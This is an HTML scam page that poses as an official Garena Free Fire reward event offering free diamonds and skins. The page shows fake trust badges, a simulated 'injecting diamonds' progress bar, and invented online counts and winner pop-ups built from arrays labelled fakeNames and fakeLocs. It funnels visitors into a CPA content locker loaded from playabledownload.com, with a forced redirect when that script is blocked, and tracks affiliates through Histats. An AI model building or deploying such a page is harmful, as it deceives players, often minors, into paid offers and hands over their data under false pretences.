<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire - Booyah Reward Event</title>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Poppins:400,600,800&display=swap">
    <link rel="icon" href="./FF.webp" type="image/x-icon">
    
    <!-- [NEW] FITUR 1: CONFIG PUSAT -->
    <script src="/config.js"></script>

    <style>
        :root { --primary: #ff6200; --accent: #ffcc00; --gold: #f1c40f; --bg-dark: #050505; }
        body { margin: 0; font-family: 'Poppins', sans-serif; color: #fff; background: var(--bg-dark); overflow-x: hidden; }
        
        /* Aurora Background FF Style */
        .aurora-bg { position: fixed; inset: 0; z-index: -1; background: radial-gradient(circle at 10% 20%, rgba(255, 98, 0, 0.4), transparent 50%), radial-gradient(circle at 90% 80%, rgba(255, 204, 0, 0.15), transparent 50%), linear-gradient(180deg, #050505 0%, #1a0f00 100%); }
        
        /* Header with Garena Logo */
        .header { width: 100%; height: 70px; background: rgba(0, 0, 0, 0.9); display: flex; align-items: center; justify-content: center; border-bottom: 3px solid var(--primary); position: fixed; top: 0; z-index: 1000; }
        .header-content { display: flex; align-items: center; gap: 15px; }
        .header img { height: 45px; }
        .publisher-separator { width: 1px; height: 25px; background: rgba(255, 255, 255, 0.3); }
        .publisher-logo { height: 25px !important; filter: grayscale(1) brightness(2); opacity: 0.8; }

        .container { display: flex; max-width: 1100px; margin: 100px auto 40px; gap: 20px; padding: 0 15px; flex-wrap: wrap; }
        .main-content { flex: 1; min-width: 300px; text-align: center; }
        
        /* Card Panel */
        .card-panel { background: rgba(255, 255, 255, 0.98); border-radius: 25px; padding: 25px; color: #333; border: 3px solid var(--primary); box-shadow: 0 10px 30px rgba(255, 98, 0, 0.2); }
        
        .hero-icon { width: 120px; margin: 10px auto; animation: float 3s ease-in-out infinite; filter: drop-shadow(0 0 15px var(--primary)); }
        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }

        /* [NEW] Online Counter & Notif Styling */
        .online-counter { display: inline-flex; align-items: center; gap: 8px; background: rgba(0,0,0,0.6); padding: 6px 15px; border-radius: 999px; margin-bottom: 15px; border: 1px solid rgba(255, 98, 0, 0.5); }
        .dot-live { width: 8px; height: 8px; background: #27ae60; border-radius: 50%; box-shadow: 0 0 8px #27ae60; animation: pulseLive 2s infinite; }
        @keyframes pulseLive { 0% { transform: scale(0.9); opacity: 1; } 70% { transform: scale(1.2); opacity: 0.5; } 100% { transform: scale(0.9); opacity: 1; } }

        .tg-notif { position: fixed; bottom: -100px; left: 20px; background: #fff; color: #333; padding: 12px 18px; border-radius: 15px; display: flex; align-items: center; gap: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); z-index: 9999; border-left: 5px solid #24A1DE; transition: 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55); }
        .tg-notif img { width: 40px; border-radius: 50%; }
        .tg-notif-text { font-size: 11px; line-height: 1.4; text-align: left; }

        /* Sidebar Styling */
        .sidebar { width: 280px; background: #fff; border-radius: 20px; padding: 20px; color: #333; height: fit-content; border: 1px solid #ddd; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
        @media (max-width: 850px) { .sidebar { display: none; } .container { justify-content: center; } }
        .stat-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 8px; border-bottom: 1px solid #eee; padding-bottom: 4px; }
        .winner-item { background: #f1f5f9; padding: 10px; border-radius: 10px; margin-bottom: 8px; font-size: 11px; text-align: left; border-left: 4px solid var(--primary); }

        h1 { color: var(--primary); text-transform: uppercase; font-size: 20px; font-weight: 800; }
        .trust-badge { margin: 5px 0 15px; display: flex; align-items: center; justify-content: center; gap: 5px; font-size: 11px; color: #27ae60; font-weight: 600; }
        
        input[type="text"] { width: 85%; padding: 15px; border-radius: 12px; border: 2px solid #ddd; font-size: 18px; text-align: center; margin-bottom: 15px; outline: none; }
        .btn-main { background: linear-gradient(180deg, #ff8c00 0%, #ff6200 100%); color: white; padding: 16px; border-radius: 15px; font-weight: 700; cursor: pointer; border: none; width: 95%; font-size: 18px; text-transform: uppercase; }

        /* Grid Items */
        .reward-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin: 20px 0; }
        .reward-item, .reward-item1 { background: #f1f5f9; border: 2px solid #eee; border-radius: 15px; padding: 12px; cursor: pointer; color: #333; font-weight: bold; transition: 0.2s; }
        .reward-item.active, .reward-item1.active { border-color: var(--primary); background: #fff4ed; transform: scale(1.03); }
        .reward-item img { width: 50px; display: block; margin: 0 auto 5px; }
        .reward-item1 img { width: 130px; display: block; margin: 0 auto 5px; }

        .progress-container { width: 100%; background: #eee; height: 18px; border-radius: 10px; margin: 15px 0; overflow: hidden; }
        .progress-bar { height: 100%; background: var(--primary); width: 0%; transition: 0.3s; }
    </style>
    
    <script type="text/javascript">var lck = false;</script>
    <script type="text/javascript" src="https://playabledownload.com/script_include.php?id=1864150"></script>
    <script type="text/javascript">if(!lck){top.location = 'https://playabledownload.com/help/ablk.php?lkt=1'; }</script>
</head>
<body>

<div class="aurora-bg"></div>
<div class="header">
    <div class="header-content">
        <img src="./FF.webp" alt="Free Fire">
        <div class="publisher-separator"></div>
        <img src="https://upload.wikimedia.org/wikipedia/id/f/f7/Garena_Logo.png" class="publisher-logo" alt="Garena">
    </div>
</div>

<div class="container">
    <div class="main-content">
        <div class="card-panel">
            
            <!-- STEP 1: LOGIN -->
            <div id="step1">
                <img src="./Diams.png" class="hero-icon" alt="FF Diamonds">
                <h1>Booyah New Year Reward</h1>
                
                <!-- [NEW] ONLINE COUNTER -->
                <div class="online-counter">
                    <div class="dot-live"></div>
                    <span style="font-size: 12px; color: #fff;">Live: <b id="user-count">1,452</b> Survivors Online</span>
                </div>

                <div class="trust-badge"><svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg> Garena Security Verified</div>
                <input type="text" id="uid" placeholder="Enter Player ID...">
                <button onclick="startProcess()" class="btn-main">Verify Account</button>
            </div>

            <!-- STEP 2: PROCESSING -->
            <div id="step-process" style="display:none">
                <div style="margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--primary); border-radius: 50%; animation: spin 1s linear infinite;"></div>
                <h2 id="counter" style="color:#333">0%</h2>
                <div class="progress-container"><div class="progress-bar" id="p-bar"></div></div>
                <p id="msg" style="color:#777">Verifying ID with Garena Servers...</p>
            </div>

            <!-- STEP 3: SELECT DIAMONDS -->
            <div id="step-select" style="display:none">
                <h1>Select Diamond Pack</h1>
                <div class="reward-grid">
                    <div class="reward-item active" onclick="selectR(this, 2180)"><img src="./Diams.png">2,180 Diamonds</div>
                    <div class="reward-item" onclick="selectR(this, 5600)"><img src="./Diams.png">5,600 Diamonds</div>
                    <div class="reward-item" onclick="selectR(this, 10500)"><img src="./Diams.png">10,500 Diamonds</div>
                    <div class="reward-item" onclick="selectR(this, 50000)"><img src="./Diams.png">50,000 Diamonds</div>
                </div>
                <button onclick="goSkinStep()" class="btn-main">Next: Choose Skin</button>
            </div>

            <!-- STEP 4: SELECT SKIN -->
            <div id="step-skin" style="display:none">
                <h1>Select 1 Bonus Skin</h1>
                <div class="reward-grid">
                    <div class="reward-item1 active" onclick="selectS(this, 'AK47 Draco')"><img src="./ak47_draco.png" class="skin-img">AK47 Draco</div>
                    <div class="reward-item1" onclick="selectS(this, 'MP40 Cobra')"><img src="./mp40_cobra.webp" class="skin-img">MP40 Cobra</div>
                </div>
                <button onclick="confirmReward()" class="btn-main">Claim All Rewards</button>
            </div>

            <!-- STEP 5: VERIFY -->
            <div id="step-verify" style="display:none">
                <h1 style="color:var(--primary)">Anti-Bot System</h1>
                <p style="color:#333">Hi <b id="user-display"></b>, your <b><span id="final-amt"></span> Diamonds</b> and <b><span id="final-skin"></span></b> are ready. Please verify to release them.</p>
                <button onclick="call_locker_smart();" class="btn-main">Verify Now</button>
            </div>
        </div>
    </div>

    <div class="sidebar">
        <h4 style="margin-top:0; color:var(--primary)">Server Information</h4>
        <div class="stat-row"><span>Status:</span><span style="color:green; font-weight:bold;">ONLINE</span></div>
        <div class="stat-row"><span>Last Update:</span><span id="date"></span></div>
        <hr>
        <h4 style="color:var(--primary)">Recent Booyah!</h4>
        <!-- [NEW] DYNAMIC SIDEBAR -->
        <div id="sidebar-rewards"></div>
    </div>
</div>

<!-- [NEW] TELEGRAM POPUP -->
<div id="tg-notif" class="tg-notif">
    <img src="https://cdn-icons-png.flaticon.com/128/3558/3558860.png" alt="bot">
    <div class="tg-notif-text">
        <b>FF Reward Bot</b> <br>
        <span id="tg-user">User123</span> claimed <span id="tg-reward">5,000 Diamonds</span>!
    </div>
</div>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script>
    // --- [NEW] CONFIGURASI UNIVERSAL ---
    const MY_REWARD_NAME = "FF Diamonds"; 
    const MY_GAME_ID = "FreeFire";

    let user_id = ""; let amount = 2180; let skin = "AK47 Draco";
    function selectR(el, amt) { $(".reward-item").removeClass("active"); $(el).addClass("active"); amount = amt; }
    function selectS(el, name) { $(".reward-item1").removeClass("active"); $(el).addClass("active"); skin = name; }
    function startProcess() { user_id = $("#uid").val(); if(user_id.length < 5) return alert("Enter valid ID"); $("#step1").hide(); $("#step-process").show(); setTimeout(() => { $("#step-process").hide(); $("#step-select").show(); }, 2000); }
    function goSkinStep() { $("#step-select").hide(); $("#step-skin").show(); }
    function confirmReward() { $("#step-skin").hide(); $("#step-process").show(); $("#msg").text("Injecting Diamonds & Skin..."); let c = 0; let iv = setInterval(() => { c += 2; if(c >= 100) { clearInterval(iv); $("#step-process").hide(); $("#user-display").text(user_id); $("#final-amt").text(amount.toLocaleString()); $("#final-skin").text(skin); $("#step-verify").show(); } $("#counter").text(c + "%"); $("#p-bar").css("width", c+"%"); }, 40); }
    
    // FUNGSI DINAMIS CPAGRIP (SMART TRACKING - DUAL KEY)
    function call_locker_smart() {
        var urlParams = new URLSearchParams(window.location.search);
        var subID = urlParams.get('s1') || 'Owner'; 
        
        // Ganti MY_GAME_ID sesuai folder (MLBB/DiceDreams/FreeFire)
        var gameName = typeof MY_GAME_ID !== 'undefined' ? MY_GAME_ID : 'Unknown';
    
        if (typeof call_locker === 'function') {
            call_locker({
                s1: subID,          // Key standar
                tracking_id: subID, // Key simulator
                s2: gameName        // Nama Game
            });
        } else {
            // Fallback jika script telat load
            alert("System busy, please try again in a few seconds.");
        }
    }
    

    // [NEW] LOGIKA BOOSTER
    const fakeNames = ["Surya_FF", "Booyah_YT", "Sultan88", "Garena_King", "FF_Pro", "Alok_Fan", "Sniper_Z"];
    const fakeLocs = ["ðŸ‡²ðŸ‡¾ MY", "ðŸ‡®ðŸ‡© ID", "ðŸ‡¹ðŸ‡­ TH", "ðŸ‡§ðŸ‡· BR", "ðŸ‡ºðŸ‡¸ US", "ðŸ‡»ðŸ‡³ VN"];
    const baseAmounts = [2180, 5600, 10500, 50000];

    let currentUsers = Math.floor(Math.random() * (3000 - 1500 + 1)) + 1500;
    function updateOnline() {
        currentUsers += Math.floor(Math.random() * 7) - 3;
        document.getElementById('user-count').innerText = currentUsers.toLocaleString();
        setTimeout(updateOnline, 4000);
    }
    updateOnline();

    function updateSidebar() {
        let name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
        let amt = baseAmounts[Math.floor(Math.random() * baseAmounts.length)];
        let html = `<div class="winner-item">User <b>${name}</b> claimed ${amt.toLocaleString()} ${MY_REWARD_NAME}<br><small>Just now</small></div>`;
        $("#sidebar-rewards").prepend(html);
        if($("#sidebar-rewards .winner-item").length > 4) $("#sidebar-rewards .winner-item:last").remove();
        setTimeout(updateSidebar, 7000);
    }
    updateSidebar();

    function showRewardNotif() {
        let name = fakeNames[Math.floor(Math.random() * fakeNames.length)];
        let loc = fakeLocs[Math.floor(Math.random() * fakeLocs.length)];
        let amt = baseAmounts[Math.floor(Math.random() * baseAmounts.length)];
        $("#tg-user").text(name + " Â· " + loc);
        $("#tg-reward").text(amt.toLocaleString() + " " + MY_REWARD_NAME);
        $("#tg-notif").css("bottom", "20px");
        setTimeout(() => { $("#tg-notif").css("bottom", "-100px"); }, 4500);
        setTimeout(showRewardNotif, 15000);
    }
    setTimeout(showRewardNotif, 6000);

    document.getElementById("date").innerHTML = new Date().getDate() + "/" + (new Date().getMonth()+1);
</script>

<!-- [NEW] SMART HISTATS -->
<script type="text/javascript">
    var urlParams = new URLSearchParams(window.location.search); var subID = urlParams.get('s1') || 'Owner';
    var activeHistatsID = teamConfig[subID] || teamConfig['Owner'];
    var _Hasync= _Hasync|| []; _Hasync.push(['Histats.start', '1,' + activeHistatsID + ',4,0,0,0,00010000']);
    _Hasync.push(['Histats.fasi', '1']); _Hasync.push(['Histats.track_hits', '']);
    _Hasync.push(['Histats.custom_variable', ['Game', MY_GAME_ID]]);
    _Hasync.push(['Histats.custom_variable', ['Member', subID]]);
    (function() { var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true; hs.src = ('//s10.histats.com/js15_as.js'); (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs); })();
</script>

<style> @keyframes spin { 100% { transform: rotate(360deg); } } </style>
</body>
</html>